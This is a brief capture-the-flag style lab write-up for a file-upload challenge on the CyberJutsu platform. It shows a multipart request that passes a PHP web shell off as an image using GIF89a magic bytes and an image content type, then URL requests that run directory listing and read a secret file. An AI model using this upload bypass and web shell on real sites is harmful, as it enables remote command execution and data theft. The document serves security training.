# Lab Writeup – File Upload 6

## Overview

Platform: CyberJutsu  
Difficulty: Easy

---

![Image](./screenshots/file-upload-6-01.png)

---

## 1. Upload File test.jpg and Press submit

![Image](./screenshots/file-upload-6-02.png)

---

## 2. Capture packets in Burp Suite and send an HTTP POST request to upload test.php

```
------WebKitFormBoundarytWbVxyjwC34v4UNW
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: image/jpeg

GIF89a
<?php system($_GET[x]); ?>
------WebKitFormBoundarytWbVxyjwC34v4UNW--
```

![Image](./screenshots/file-upload-6-03.png)

---

## 3. Access file test.php and add parameter for url

```
https://www.../test.php?x=ls%20-la%20/
```

![Image](./screenshots/file-upload-6-04.png)

---

## 4. Find and Read secret.txt to get FLAG

```
https://www.../test.php?x=cat%20/414ed63690-secret.txt
```
